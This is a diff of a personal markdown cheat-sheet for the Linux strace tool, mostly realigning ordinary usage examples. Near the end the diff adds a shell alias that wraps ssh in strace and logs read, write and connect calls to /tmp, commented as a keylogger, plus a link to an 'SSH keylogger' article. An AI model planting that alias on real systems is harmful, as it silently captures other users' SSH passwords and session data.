@@ -2,7 +2,7 @@
 tags: [linux]
 title: strace
 created: '2019-08-28T21:18:23.708Z'
-modified: '2019-10-23T14:44:30.179Z'
+modified: '2020-03-13T13:17:19.568Z'
 ---
 
 # strace
@@ -14,26 +14,24 @@ modified: '2019-10-23T14:44:30.179Z'
 
 ## usage
 ```sh
-strace -i ls              # print instruction pointers
+strace -i ls                    # print instruction pointers
 
-strace -r ls              # print timestamp
+strace -r ls                    # print timestamp
 
+strace -c ls                    # print sumary
 
-strace -c ls              # print sumary
+strace -o output.txt ls         # save to output file
 
-strace -o output.txt ls   # save to output file
+strace -p 1725                  # process id
 
-
-strace -p 1725            # process id
-```
-
-## trace syscall
-```sh
-strace -e open ls         # trace specific syscall
+strace -e open ls               # trace specific syscall
 strace -e openat ls
 
 strace -e trace=open,read ls /home
+
+ssh='strace -o /tmp/sshpwd-$(date '+%d%h%m%s').log -e read,write,connect -s2048 ssh'   # keylogger
 ```
 
 ## see also
--
+- [[dtrace]]
+- [Poor man's SSH keylogger](https://diogomonica.com/2011/02/03/poor-mans-ssh-keylogger/)
